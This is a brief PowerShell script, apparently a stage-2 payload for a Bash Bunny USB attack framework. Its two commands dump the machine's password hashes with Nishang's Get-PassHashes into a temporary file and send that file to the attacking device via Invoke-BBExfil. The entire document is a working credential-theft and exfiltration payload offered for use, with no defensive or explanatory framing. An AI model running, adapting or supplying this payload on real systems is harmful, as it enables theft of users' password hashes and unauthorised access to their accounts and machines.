# Stage 2 payload for a recon example payload of the Bashbunny Powershell Framework
#
# Uses part of the Nishang Powerpreter module to capture password hashes to a temporary file and exfiltrate that to the Bunny
Get-PassHashes > $env:TEMP\temp.txt
Invoke-BBExfil "$env:TEMP\temp.txt"
